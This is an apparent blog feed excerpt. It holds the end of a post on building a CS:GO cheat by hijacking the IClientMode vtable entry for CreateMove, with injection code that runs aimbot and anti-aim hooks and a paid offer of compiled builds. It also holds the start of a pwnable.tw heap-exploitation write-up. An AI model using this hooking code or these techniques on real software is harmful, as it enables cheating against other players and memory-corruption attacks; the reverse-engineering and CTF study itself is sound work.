punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  C_BasePlayer <span class=\"token operator\">*</span>pPlayer <span class=\"token operator\">=</span> <span class=\"token class-name\">C_BasePlayer</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">GetLocalPlayer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pPlayer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">return</span> pPlayer<span class=\"token operator\">-></span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>flInputSampleTime<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// game/client/c_baseplayer.cpp</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">C_BasePlayer</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> flInputSampleTime<span class=\"token punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span>pCmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  CBaseCombatWeapon <span class=\"token operator\">*</span>pWeapon <span class=\"token operator\">=</span> <span class=\"token function\">GetActiveWeapon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pWeapon<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    pWeapon<span class=\"token operator\">-></span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>flInputSampleTime<span class=\"token punctuation\">,</span> pCmd<span class=\"token punctuation\">,</span> m_vecOldViewAngles<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"analysis\"><a class=\"markdownIt-Anchor\" href=\"#analysis\">#</a> Analysis</h2>\n<p>Here are the definitions of  <code>ClientModeShared</code>  and its primary base class,  <code>IClientMode</code> .</p>\n<ul>\n<li>Both IClientMode and ClientModeShared will share the same vtable.</li>\n<li>The order of virtual functions appeared in the primary vtable will be the same as how they are declared in the base class.</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// game/client/clientmode_shared.h</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ClientModeShared</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">IClientMode</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">CGameEventListener</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">DECLARE_CLASS_NOBASE</span><span class=\"token punctuation\">(</span> ClientModeShared <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">ClientModeShared</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token operator\">~</span><span class=\"token function\">ClientModeShared</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">Init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">InitViewport</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">VGui_Shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">Shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">ProcessInput</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">bool</span> bActive<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> flInputSampleTime<span class=\"token punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// game/client/iclientmode.h</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>abstract_class IClientMode <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token operator\">~</span><span class=\"token function\">IClientMode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// Called before the HUD is initialized.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">InitViewport</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">Init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">VGui_Shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">Shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// Called when switching from one IClientMode to another.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// This can re-layout the view and such.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">// Note that Enable and Disable are called when the DLL initializes and shuts down.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">Enable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">EnableWithRootPanel</span><span class=\"token punctuation\">(</span>vgui<span class=\"token double-colon punctuation\">::</span>VPANEL pRoot<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">OverrideMouseInput</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">float</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> flInputSampleTime<span class=\"token punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">LevelInit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>newmap<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">LevelShutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"finding-the-index-of-createmove-in-the-vtable-of-iclientmode\"><a class=\"markdownIt-Anchor\" href=\"#finding-the-index-of-createmove-in-the-vtable-of-iclientmode\">#</a> Finding the Index of  <code>CreateMove()</code>  in the vtable of  <code>IClientMode</code></h2>\n<p>As of now, we know about two things:</p>\n<ul>\n<li>From Valve Developer Wiki,  <code>IClientMode::CreateMove()</code>  has a chance to edit the  <code>CUserCmd</code>  before it is sent to the server.</li>\n<li>If we can leverage <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yODg4ODAwMDA5LmdpdGh1Yi5pby9zb2Z0d2FyZS9zZWN1cml0eS9iaW5hcnkvdnRhYmxlLWhpamFja2luZy8=\">vtable hijacking</span> and overwrite the address of  <code>CreateMove()</code>  in the vtable, our cheat will have a chance to r/w CUserCmd.\n<ul>\n<li>ClientModeShared::CreateMove() calls C_BasePlayer::CreateMove().</li>\n<li>IClientMode is the primary base class of ClientModeShared, so they share the same vtable.</li>\n<li>Now we need to find the index of  <code>CreateMove()</code>  within the vtable of  <code>IClientMode</code> .</li>\n</ul>\n</li>\n</ul>\n<p>A commonly used technique to find the index of a virtual function within a vtable is leveraging string literals. If we read ClientModeShared::CreateMove() and C_BasePlayer::CreateMove(), we‚Äôll only find out that there are no useful string literals in these two functions. üòì Luckily, in  <code>ClientModeShared::LevelInit()</code> , there are <strong>three string literals</strong>!</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">ClientModeShared</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">LevelInit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>newmap<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  m_pViewport<span class=\"token operator\">-></span><span class=\"token function\">GetAnimationController</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">StartAnimationSequence</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LevelInit\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// Tell the Chat Interface</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_pChatElement<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    m_pChatElement<span class=\"token operator\">-></span><span class=\"token function\">LevelInit</span><span class=\"token punctuation\">(</span>newmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// we have to fake this event clientside, because clients connect after that</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  IGameEvent <span class=\"token operator\">*</span>event <span class=\"token operator\">=</span> gameeventmanager<span class=\"token operator\">-></span><span class=\"token function\">CreateEvent</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"game_newmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    event<span class=\"token operator\">-></span><span class=\"token function\">SetString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mapname\"</span><span class=\"token punctuation\">,</span> newmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    gameeventmanager<span class=\"token operator\">-></span><span class=\"token function\">FireEventClientSide</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// Create a vgui context for all of the in-game vgui panels...</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s_hVGuiContext <span class=\"token operator\">==</span> DEFAULT_VGUI_CONTEXT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    s_hVGuiContext <span class=\"token operator\">=</span> vgui<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">ivgui</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">CreateContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// Reset any player explosion/shock effects</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  CLocalPlayerFilter filter<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  enginesound<span class=\"token operator\">-></span><span class=\"token function\">SetPlayerDSP</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>We‚Äôll choose the string ‚ÄúLevelInit‚Äù. Search it in IDA.</p>\n<p><img data-src=\"ida-levelinit-search.png\" alt=\"\"></p>\n<p><img data-src=\"ida-levelinit-search-result.png\" alt=\"\"></p>\n<p>Bingo! The first one is  <code>ClientModeShared::LevelInit()</code>  (sub_1639A0)</p>\n<p><img data-src=\"ida-levelinit-bingo.png\" alt=\"\"></p>\n<p>Decompile it, just to make sure it really is the one we‚Äôre looking for. LGTM. ü§§</p>\n<p><img data-src=\"ida-levelinit-decompiled.png\" alt=\"\"></p>\n<p>List all the xrefs to  <code>sub_1639A0</code> , and here the second one is the vtable entry we‚Äôre looking for.</p>\n<p><img data-src=\"ida-levelinit-xref.png\" alt=\"\"></p>\n<p>Let‚Äôs take a look at the vtable‚Ä¶  <code>LevelInit()</code> 's index is 26, so  <code>CreateMove()</code> 's index will be 25.</p>\n<p><img data-src=\"ida-levelinit-vtable.png\" alt=\"\"></p>\n<h2 id=\"exploitation\"><a class=\"markdownIt-Anchor\" href=\"#exploitation\">#</a> Exploitation</h2>\n<p>I‚Äôm running x86_64 CS:GO on my M1 Pro MacBook Pro through rosetta2, so we‚Äôll compile and link our cheat into a x86_64 dylib, and then use lldb to inject it into the CS:GO process. The piece of code that hijacks the vtable of  <code>IClientMode</code>  will look something like this:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token function\">OnDylibLoad</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// Obtain the `this` pointer to `ClientModeShared`.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">auto</span> clientMode <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">reinterpret_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>IClientMode <span class=\"token operator\">*</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token function\">GetClientMode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// Backup the address of the original CreateMove().</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">using</span> CreateMoveFn <span class=\"token operator\">=</span> <span class=\"token keyword\">bool</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>IClientMode <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">float</span><span class=\"token punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  CreateMoveFn originalCreateMove <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">GetVFunc</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>CreateMoveFn<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>clientMode<span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// Overwrite the address of CreateMove() with our own CreateMove().</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  memory<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">PutVFunc</span><span class=\"token punctuation\">(</span>clientMode<span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> CreateMoveHook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// The original method prototype is: IClientMode::CreateMove().</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// So the first argument will be the `this` pointer. Furthermore,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// since IClientMode is the primary base class of ClientModeShared,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// so using `IClientMode *` and `ClientModeShared` are both okay</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// since they will have the same address.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>IClientMode <span class=\"token operator\">*</span>thisptr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">float</span> frameTime<span class=\"token punctuation\">,</span> CUserCmd <span class=\"token operator\">*</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>prediction<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">StartPrediction</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>bhop<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>antiaim<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>autostrafe<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>aimbot<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">,</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  hacks<span class=\"token double-colon punctuation\">::</span>prediction<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">EndPrediction</span><span class=\"token punctuation\">(</span>localPlayer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Here‚Äôs my <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Flc29waG9yL2hhdm9jLmNj\">full source code of my CS:GO cheat</span>, but I won‚Äôt provide any instructions or tutorials on building the project. If you want to receive a pre-compiled dylib instead of figuring out by yourself, contact me m.aesophor [at] <span class=\"exturl\" data-url=\"aHR0cDovL2dtYWlsLmNvbQ==\">gmail.com</span> for a price.</p>\n",
            "tags": [
                "cpp",
                "reverse engineering"
            ]
        },
        {
            "id": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "url": "https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/",
            "title": "[pwnable.tw] Secret Garden (350 pts)",
            "date_published": "2022-08-27T06:06:00.000Z",
            "content_html": "<p><img data-src=\"banner.png\" alt=\"banner\"></p>\n<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>Let‚Äôs solve the heap exploitation challenge, <strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLnR3L2NoYWxsZW5nZS8jMTI=\">Secret Garden [350 pts]</span></strong> (x86_64, glibc 2.23). In summary:</p>\n<ul>\n<li>Free a large chunk into the unsorted bin.</li>\n<li>The  <code>fd</code>  field of the freed chunk in the unsorted bin contains a libc address whose offset within libc is a fixed value.</li>\n<li>Visit the garden and leak the libc base to stdout.</li>\n<li>Overwrite  <code>__malloc_hook</code>  with a one gadget using fastbin dup.</li>\n<li>Trigger our  <code>__malloc_hook</code>  via  <code>malloc_printerr()</code> .</li>\n</ul>\n<h1 id=\"analysis\"><a class=\"markdownIt-Anchor\" href=\"#analysis\">#</a> Analysis</h1>\n<p>Sounds easy enough, eh? This challenge is perfect for someone who‚Äôs new to heap exploitation, as it allows us to learn how fastbin dup works, and overall it‚Äôs not too complicated. Okay, enough talk, let‚Äôs get started. Running the binary shows the following output:</p>\n<pre><code>‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ\n‚òÜ          Secret Garden          ‚òÜ\n‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ ‚òÜ\n\n  1 . Raise a flower\n  2 . Visit the garden\n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice :\n</code></pre>\n<br>\n<p>Only the first three options are required for exploitation:</p>\n<ol>\n<li>Raise a flower:\n<ul>\n<li>malloc() twice.</li>\n<li>The first malloc(0x28) allocates a flower struct.</li>\n<li>The second malloc() allows us to specify the size.\n<ul>\n<li>Then it calls read() to let us edit the chunk‚Äôs user data.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Visit the garden:\n<ul>\n<li>Print all the flowers‚Äôs data.</li>\n</ul>\n</li>\n<li>Remove a flower from the garden (by index):\n<ul>\n<li>Clear the flower struct‚Äôs first QWORD (i.e.  <code>fd</code>  field)</li>\n<li>free() the flower but doesn‚Äôt set it to 